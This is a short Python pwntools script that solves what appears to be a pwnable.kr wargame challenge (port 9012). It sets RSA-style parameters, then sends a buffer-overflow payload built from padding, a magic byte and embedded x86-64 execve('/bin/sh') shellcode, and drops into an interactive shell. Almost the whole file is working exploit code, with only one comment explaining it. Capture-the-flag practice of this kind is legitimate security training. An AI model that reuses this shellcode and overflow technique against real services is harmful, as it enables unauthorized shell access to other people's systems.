from pwn import *
import struct

# 利用溢出漏洞的方法，pow(MAGIC_BYTE, EXPONENT, P * Q) == 0x602563
MAGIC_BYTE = b"\x1b"
P = 1720
Q = 4679
EXPONENT = 5
D = 3216593

SHELLCODE_BYTES = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

PAD_CHAR = b"A"
LEN_FROM_EBUF_TO_FUNC_BUF = 1056 // 4
INPUT_PREFIX = 3 * PAD_CHAR
PAD_LEN = LEN_FROM_EBUF_TO_FUNC_BUF - len(INPUT_PREFIX) - len(SHELLCODE_BYTES)
INPUT_PAD = PAD_LEN * PAD_CHAR
EXPLOIT_INPUT = INPUT_PREFIX + SHELLCODE_BYTES + INPUT_PAD + MAGIC_BYTE


r = remote("pwnable.kr", 9012)
print(r.recvuntil("> "))
r.sendline("1")


print(r.recvuntil("p : "))
r.sendline(str(P))
print(r.recvuntil("q : "))
r.sendline(str(Q))
print(r.recvuntil("e : "))
r.sendline(str(EXPONENT))
print(r.recvuntil("d : "))
r.sendline(str(D))

print(r.recvuntil("> "))
r.sendline("2")

print(r.recvuntil("(max=1024) : "))
r.sendline(str(len(EXPLOIT_INPUT)))
print(r.recvuntil("data\n"))
r.sendline(EXPLOIT_INPUT)

print(r.recvuntil("> "))
r.sendline("1")
r.interactive()